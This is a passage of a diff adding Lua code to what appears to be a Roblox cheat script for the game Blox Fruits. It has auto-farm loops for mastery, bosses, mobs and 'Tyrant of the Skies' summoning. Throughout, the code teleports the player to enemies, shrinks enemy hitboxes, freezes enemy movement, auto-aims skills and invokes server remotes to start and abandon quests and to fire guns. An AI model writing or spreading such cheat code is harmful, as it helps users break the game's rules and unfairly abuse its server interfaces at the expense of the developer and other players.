+                                        EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+                                        UseSkill = true;
+                                        Skillaimbot = true;
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                        CFrame.Angles(math.rad((-90)), 0, 0));
+                                    else
+                                        UseSkill = false;
+                                        Skillaimbot = false;
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        NormalAttack();
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    end
+                                    AutoHaki();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    AimBotSkillPosition = v.HumanoidRootPart.Position;
+                                until not _G.Settings.Main["Auto Farm Fruit Mastery"] or v.Humanoid.Health <= 0 or
+                                    (not v.Parent) or
+                                    (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                    not _G.Settings.Main["Mastery Method"] == "Cakeprince";
+                                UseSkill = false;
+                                Skillaimbot = false;
+                            end
+                        elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Baking Staff") then
+                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Fruit Mastery"] and _G.Settings.Main["Mastery Method"] == "Nearest" then
+            pcall(function()
+                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                    if v.Name and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
+                            (v:FindFirstChild("HumanoidRootPart")).Position).Magnitude <= 2000 then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                    100 then
+                                    EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                    CFrame.Angles(math.rad((-90)), 0, 0));
+                                    Skillaimbot = true;
+                                    UseSkill = true;
+                                else
+                                    Skillaimbot = false;
+                                    UseSkill = false;
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    NormalAttack();
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                end
+                                AutoHaki();
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                v.HumanoidRootPart.Transparency = 1;
+                                v.Humanoid.JumpPower = 0;
+                                v.Humanoid.WalkSpeed = 0;
+                                PosMon = v.HumanoidRootPart.CFrame;
+                                MonFarm = v.Name;
+                                AimBotSkillPosition = v.HumanoidRootPart.Position;
+                            until not _G.Settings.Main["Auto Farm Fruit Mastery"] or (not v.Parent) or v.Humanoid.Health ==
+                                0 or not _G.Settings.Main["Mastery Method"] == "Nearest";
+                            UseSkill = false;
+                            Skillaimbot = false;
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Fruit Mastery"] and _G.Settings.Main["Mastery Method"] == "Boss" then
+            if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                CheckBossQuest();
+                TweenPlayer(CFrameQBoss);
+                if (CFrameQBoss.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                    5 then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuestBoss,
+                        QuestLvBoss);
+                end
+            elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                pcall(function()
+                    CheckBossQuest();
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild(SelectBoss) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v.Name == selectBoss and v:FindFirstChild("Humanoid") and
+                                v:FindFirstChild("HumanoidRootPart") then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                        100 then
+                                        EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                        CFrame.Angles(math.rad((-90)), 0, 0));
+                                        Skillaimbot = true;
+                                        UseSkill = true;
+                                    else
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        UseSkill = false;
+                                        Skillaimbot = false;
+                                        NormalAttack();
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    end
+                                    AutoHaki();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    AimBotSkillPosition = v.HumanoidRootPart.Position;
+                                until not _G.Settings.Main["Auto Farm Fruit Mastery"] or
+                                    not _G.Settings.Main["Mastery Method"] == "Boss" or (not v.Parent) or
+                                    v.Humanoid.Health == 0 or game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible ==
+                                    false or (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name));
+                                UseSkill = false;
+                                Skillaimbot = false;
+                            end
+                        end
+                    else
+                        UseSkill = false;
+                        Skillaimbot = false;
+                    end
+                end);
+            end
+        end
+    end
+end);
+spawn(function()
+    while task.wait(0.2) do
+        if _G.Settings.Main["Auto Farm Gun Mastery"] and _G.Settings.Main["Mastery Method"] == "Quest" then
+            pcall(function()
+                CheckQuest();
+                if not string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text, NameMon) or
+                    (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+                    TweenPlayer(CFrameQuest);
+                    if (CFrameQuest.Position -
+                        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5 then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuest,
+                            LevelQuest);
+                    end
+                elseif string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text, NameMon) or
+                    (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                    if game.Workspace.Enemies:FindFirstChild(Mon) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                                if v.Name == Mon then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        if v.Humanoid.Health <= v.Humanoid.MaxHealth *
+                                            _G.Settings.Setting["Mastery Health"] / 100 then
+                                            EquipWeapon(SelectWeaponGun);
+                                            local ShootPosition =
+                                                (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart
+                                                    .CFrame * CFrame.new(0, (-15), 0);
+                                            ((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild(
+                                                "")):InvokeServer("TAP", Vector3.new(ShootPosition.Position));
+                                            TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                            CFrame.Angles(math.rad((-90)), 0, 0));
+                                            UseGunSkill = true;
+                                            Skillaimbot = true;
+                                        else
+                                            UseGunSkill = false;
+                                            Skillaimbot = false;
+                                            EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        end
+                                        AutoHaki();
+                                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        v.HumanoidRootPart.Transparency = 1;
+                                        v.Humanoid.JumpPower = 0;
+                                        v.Humanoid.WalkSpeed = 0;
+                                        NormalAttack();
+                                        PosMon = v.HumanoidRootPart.CFrame;
+                                        MonFarm = v.Name;
+                                        AimBotSkillPosition = v.HumanoidRootPart.Position;
+                                    until not _G.Settings.Main["Auto Farm Gun Mastery"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0 or
+                                        (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false or
+                                        (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                        not _G.Settings.Main["Mastery Method"] == "Quest";
+                                    UseGunSkill = false;
+                                    Skillaimbot = false;
+                                end
+                            end
+                        end
+                    else
+                        UseGunSkill = false;
+                        Skillaimbot = false;
+                        TweenPlayer(CFrameMon);
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Gun Mastery"] and _G.Settings.Main["Mastery Method"] == "No Quest" then
+            pcall(function()
+                CheckQuest();
+                TweenPlayer(CFrameMon);
+                if game.Workspace.Enemies:FindFirstChild(Mon) then
+                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                        if v.Name == Mon and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                    100 then
+                                    local ShootPosition = (game:GetService("Players")).LocalPlayer.Character
+                                                              .HumanoidRootPart.CFrame * CFrame.new(0, (-15), 0);
+                                    ((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild("")):InvokeServer(
+                                        "TAP", Vector3.new(ShootPosition.Position));
+                                    EquipWeapon(SelectWeaponGun);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                    CFrame.Angles(math.rad((-90)), 0, 0));
+                                    UseGunSkill = true;
+                                    Skillaimbot = true;
+                                else
+                                    Skillaimbot = false;
+                                    UseGunSkill = false;
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                end
+                                AutoHaki();
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                v.HumanoidRootPart.Transparency = 1;
+                                v.Humanoid.JumpPower = 0;
+                                v.Humanoid.WalkSpeed = 0;
+                                PosMon = v.HumanoidRootPart.CFrame;
+                                MonFarm = v.Name;
+                                NormalAttack();
+                                AimBotSkillPosition = v.HumanoidRootPart.Position;
+                            until not _G.Settings.Main["Auto Farm Gun Mastery"] or (not v.Parent) or v.Humanoid.Health <=
+                                0 or (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name)) or
+                                not _G.Settings.Main["Mastery Method"] == "No Quest";
+                        end
+                    end
+                else
+                    UseGunSkill = false;
+                    Skillaimbot = false;
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrameMon);
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Gun Mastery"] and _G.Settings.Main["Mastery Method"] == "Bones" then
+            pcall(function()
+                TweenPlayer(QuestBonePos);
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or
+                            v.Name == "Posessed Mummy" then
+                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                        100 then
+                                        EquipWeapon(SelectWeaponGun);
+                                        local ShootPosition =
+                                            (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame *
+                                                CFrame.new(0, (-15), 0);
+                                        ((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild("")):InvokeServer(
+                                            "TAP", Vector3.new(ShootPosition.Position));
+                                        UseGunSkill = true;
+                                        Skillaimbot = true;
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                        CFrame.Angles(math.rad((-90)), 0, 0));
+                                    else
+                                        UseGunSkill = false;
+                                        Skillaimbot = false;
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    end
+                                    AutoHaki();
+                                    NormalAttack();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    AimBotSkillPosition = v.HumanoidRootPart.Position;
+                                until not _G.Settings.Main["Auto Farm Gun Mastery"] or
+                                    not _G.Settings.Main["Mastery Method"] == "Bones" or v.Humanoid.Health <= 0 or
+                                    (not v.Parent);
+                                UseGunSkill = false;
+                                Skillaimbot = false;
+                            elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Demonic Soul") then
+                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                            end
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Gun Mastery"] and _G.Settings.Main["Mastery Method"] == "Cakeprince" then
+            pcall(function()
+                local PosCake = CFrame.new(-2091.911865234375, 70.00884246826172, -12142.8359375);
+                TweenPlayer(PosCake);
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Cookie Crafter") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Guard") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Baking Staff") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Head Baker") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name ==
+                            "Head Baker" then
+                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                        100 then
+                                        EquipWeapon(SelectWeaponGun);
+                                        local ShootPosition =
+                                            (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame *
+                                                CFrame.new(0, (-15), 0);
+                                        ((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild("")):InvokeServer(
+                                            "TAP", Vector3.new(ShootPosition.Position));
+                                        UseGunSkill = true;
+                                        Skillaimbot = true;
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                        CFrame.Angles(math.rad((-90)), 0, 0));
+                                    else
+                                        UseGunSkill = false;
+                                        Skillaimbot = false;
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    end
+                                    AutoHaki();
+                                    NormalAttack();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    AimBotSkillPosition = v.HumanoidRootPart.Position;
+                                until not _G.Settings.Main["Auto Farm Gun Mastery"] or
+                                    not _G.Settings.Main["Mastery Method"] == "Cakeprince" or v.Humanoid.Health <= 0 or
+                                    (not v.Parent);
+                                UseGunSkill = false;
+                                Skillaimbot = false;
+                            elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Cake Guard") then
+                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                            end
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Gun Mastery"] and _G.Settings.Main["Mastery Method"] == "Nearest" then
+            pcall(function()
+                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                    if v.Name and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
+                            (v:FindFirstChild("HumanoidRootPart")).Position).Magnitude <= 2000 then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                    100 then
+                                    EquipWeapon(SelectWeaponGun);
+                                    local ShootPosition = (game:GetService("Players")).LocalPlayer.Character
+                                                              .HumanoidRootPart.CFrame * CFrame.new(0, (-15), 0);
+                                    ((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild("")):InvokeServer(
+                                        "TAP", Vector3.new(ShootPosition.Position));
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                    CFrame.Angles(math.rad((-90)), 0, 0));
+                                    UseGunSkill = true;
+                                    Skillaimbot = true;
+                                else
+                                    UseGunSkill = false;
+                                    Skillaimbot = false;
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                end
+                                AutoHaki();
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                v.HumanoidRootPart.Transparency = 1;
+                                v.Humanoid.JumpPower = 0;
+                                v.Humanoid.WalkSpeed = 0;
+                                PosMon = v.HumanoidRootPart.CFrame;
+                                MonFarm = v.Name;
+                                NormalAttack();
+                                AimBotSkillPosition = v.HumanoidRootPart.Position;
+                            until not _G.Settings.Main["Auto Farm Gun Mastery"] or (not v.Parent) or v.Humanoid.Health <=
+                                0 or not _G.Settings.Main["Mastery Method"] == "Nearest";
+                            UseGunSkill = false;
+                            Skillaimbot = false;
+                        end
+                    end
+                end
+            end);
+        elseif _G.Settings.Main["Auto Farm Gun Mastery"] and _G.Settings.Main["Mastery Method"] == "Boss" then
+            if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                CheckBossQuest();
+                TweenPlayer(CFrameQBoss);
+                if (CFrameQBoss.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                    5 then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuestBoss,
+                        QuestLvBoss);
+                end
+            elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                pcall(function()
+                    CheckBossQuest();
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild(SelectBoss) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v.Name == selectBoss and v:FindFirstChild("Humanoid") and
+                                v:FindFirstChild("HumanoidRootPart") then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Settings.Setting["Mastery Health"] /
+                                        100 then
+                                        EquipWeapon(SelectWeaponGun);
+                                        local ShootPosition =
+                                            (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame *
+                                                CFrame.new(0, (-15), 0);
+                                        ((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild("")):InvokeServer(
+                                            "TAP", Vector3.new(ShootPosition.Position));
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) *
+                                                        CFrame.Angles(math.rad((-90)), 0, 0));
+                                        UseGunSkill = true;
+                                        Skillaimbot = true;
+                                    else
+                                        UseGunSkill = false;
+                                        Skillaimbot = false;
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    end
+                                    AutoHaki();
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    NormalAttack();
+                                    AimBotSkillPosition = v.HumanoidRootPart.Position;
+                                until not _G.Settings.Main["Auto Farm Gun Mastery"] or
+                                    not _G.Settings.Main["Mastery Method"] == "Boss" or (not v.Parent) or
+                                    v.Humanoid.Health <= 0 or game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible ==
+                                    false or (not (game:GetService("Workspace")).Enemies:FindFirstChild(v.Name));
+                                Skillaimbot = false;
+                            end
+                        end
+                    else
+                        UseGunSkill = false;
+                        Skillaimbot = false;
+                        TweenPlayer(((game:GetService("ReplicatedStorage")):FindFirstChild(SelectBoss)).HumanoidRootPart
+                                        .CFrame * Pos);
+                    end
+                end);
+            end
+        end
+    end
+end);
+TyrantOfTheSkiesSection = Tabs.MainTab:Section({
+    Title = "Tyrant Of The Skies | New Farm Boss Chim",
+    TextXAlignment = "Left"
+});
+AutoSummonTyrantOfTheSkiesToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Summon Tyrant Of The Skies",
+    Desc = "Auto Farming Monsters and Summoning Bosses",
+    Default = false,
+    Callback = function(state)
+        _G.Settings.Main["Auto Summon Tyrant Of The Skies"] = state;
+        StopTween(_G.Settings.Main["Auto Summon Tyrant Of The Skies"]);
+    end
+});
+function checkEagleEye()
+    local islandModel = (game:GetService("Workspace")).Map.TikiOutpost.IslandModel;
+    local targetEyes = {
+        Eye1 = false,
+        Eye2 = false,
+        Eye3 = false,
+        Eye4 = false
+    };
+    for _, v in ipairs(islandModel:GetChildren()) do
+        if string.match(v.Name, "^Eye%d$") and targetEyes[v.Name] ~= nil then
+            if tonumber(v.Transparency) == 0 then
+                targetEyes[v.Name] = true;
+            end
+        end
+    end
+    for _, found in pairs(targetEyes) do
+        if not found then
+            return false;
+        end
+    end
+    return true;
+end
+function AttackGucci()
+    for _, model in pairs((game:GetService("Workspace")).Map.TikiOutpost.IslandModel:GetChildren()) do
+        if model:FindFirstChild("EagleBossArena") then
+            for i, v in pairs(model.EagleBossArena:GetChildren()) do
+                if v.Name == "Tree" then
+                    TweenPlayer(CFrame.new(v.WorldPivot.Position));
+                    useAllSkill();
+                end
+            end
+        end
+    end
+end
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Main["Auto Summon Tyrant Of The Skies"] then
+            pcall(function()
+                if not (game:GetService("Workspace")).Enemies:FindFirstChild("Tyrant of the Skies") then
+                    if not checkEagleEye() then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v.Name == "Serpent Hunter" or v.Name == "Skull Slayer" or v.Name == "Isle Champion" or
+                                v.Name == "Sun-kissed Warrior" then
+                                if v.Humanoid and v.Humanoid.Health > 0 then
+                                    repeat
+                                        wait();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        Attack();
+                                        AutoHaki();
+                                        v.Humanoid.JumpPower = 0;
+                                        v.Humanoid.WalkSpeed = 0;
+                                        PosMon = v.HumanoidRootPart.CFrame;
+                                        MonFarm = v.Name;
+                                    until not v.Parent or v.Humanoid.Health <= 0 or checkEagleEye() or
+                                        (not _G.Settings.Main["Auto Summon Tyrant Of The Skies"]);
+                                end
+                            end
+                        end
+                    else
+                        repeat
+                            wait()
+                            AttackGucci();
+                        until (game:GetService("Workspace")).Enemies:FindFirstChild("Tyrant of the Skies") or
+                            (not _G.Settings.Main["Auto Summon Tyrant Of The Skies"]);
+                    end
+                end
+            end);
+        end
+    end
+end);
+AutoKillTyrantOfTheSkiesToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Kill Tyrant Of The Skies",
+    Desc = "Auto Boss Bird Attack",
+    Default = false,
+    Callback = function(state)
+        _G.Settings.Main["Auto Kill Tyrant Of The Skies"] = state;
+        StopTween(_G.Settings.Main["Auto Kill Tyrant Of The Skies"]);
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Main["Auto Kill Tyrant Of The Skies"] then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Tyrant of the Skies") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Tyrant of the Skies" then
+                            repeat
+                                wait();
+                                EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                Attack();
+                                AutoHaki();
+                                v.Humanoid.JumpPower = 0;
+                                v.Humanoid.WalkSpeed = 0;
+                            until not v.parent or
+                                (not (game:GetService("Workspace")).Enemies:FindFirstChild("Tyrant of the Skies")) or
+                                (not _G.Settings.Main["Auto Kill Tyrant Of The Skies"]);
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+MonFarmSection = Tabs.MainTab:Section({
+    Title = "Mon Farm",
+    TextXAlignment = "Left"
+});
+if World1 then
+    tableMon = {"Bandit", "Monkey", "Gorilla", "Pirate", "Brute", "Desert Bandit", "Desert Officer", "Snow Bandit",
+                "Snowman", "Chief Petty Officer", "Sky Bandit", "Dark Master", "Toga Warrior", "Gladiator",
+                "Military Soldier", "Military Spy", "Fishman Warrior", "Fishman Commando", "God's Guard", "Shanda",
+                "Royal Squad", "Royal Soldier", "Galley Pirate", "Galley Captain"};
+elseif World2 then
+    tableMon = {"Raider", "Mercenary", "Swan Pirate", "Factory Staff", "Marine Lieutenant", "Marine Captain", "Zombie",
+                "Vampire", "Snow Trooper", "Winter Warrior", "Lab Subordinate", "Horned Warrior", "Magma Ninja",
+                "Lava Pirate", "Ship Deckhand", "Ship Engineer", "Ship Steward", "Ship Officer", "Arctic Warrior",
+                "Snow Lurker", "Sea Soldier", "Water Fighter"};
+elseif World3 then
+    tableMon = {"Pirate Millionaire", "Dragon Crew Warrior", "Dragon Crew Archer", "Female Islander", "Giant Islander",
+                "Marine Commodore", "Marine Rear Admiral", "Fishman Raider", "Fishman Captain", "Forest Pirate",
+                "Mythological Pirate", "Jungle Pirate", "Musketeer Pirate", "Reborn Skeleton", "Living Zombie",
+                "Demonic Soul", "Posessed Mummy", "Peanut Scout", "Peanut President", "Ice Cream Chef",
+                "Ice Cream Commander", "Cookie Crafter", "Cake Guard", "Baking Staff", "Head Baker", "Cocoa Warrior",
+                "Chocolate Bar Battler", "Sweet Thief", "Candy Rebel", "Candy Pirate", "Snow Demon", "Isle Outlaw",
+                "Island Boy", "Sun-kissed Warrior", "Isle Champion"};
+end
+ChooseMonDropdown = Tabs.MainTab:Dropdown({
+    Title = "Choose Mon",
+    Values = tableMon,
+    Value = _G.Settings.Main["Selected Mon"],
+    Callback = function(option)
+        _G.Settings.Main["Selected Mon"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+AutoMonFarmToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Farm Mon",
+    Desc = "Auto Kill Mon When Spawn",
+    Value = _G.Settings.Main["Auto Farm Mon"],
+    Callback = function(state)
+        _G.Settings.Main["Auto Farm Mon"] = state;
+        StopTween(_G.Settings.Main["Auto Farm Mon"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Main["Auto Farm Mon"] then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild(_G.Settings.Main["Selected Mon"]) then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == _G.Settings.Main["Selected Mon"] then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Main["Auto Farm Mon"] or (not v.Parent) or v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+BossSection = Tabs.MainTab:Section({
+    Title = "Boss Farm",
+    TextXAlignment = "Left"
+});
+BossStatusParagraph = Tabs.MainTab:Paragraph({
+    Title = "Boss Status",
+    Desc = "N/A"
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if (game:GetService("ReplicatedStorage")):FindFirstChild(_G.Settings.Main["Selected Boss"]) or
+                (game:GetService("Workspace")).Enemies:FindFirstChild(_G.Settings.Main["Selected Boss"]) then
+                BossStatusParagraph:SetDesc("Spawn!");
+            else
+                BossStatusParagraph:SetDesc("Not Spawn");
+            end
+        end);
+    end
+end);
+if World1 then
+    tableBoss = {"The Gorilla King", "Bobby", "Yeti", "Mob Leader", "Vice Admiral", "Warden", "Chief Warden", "Swan",
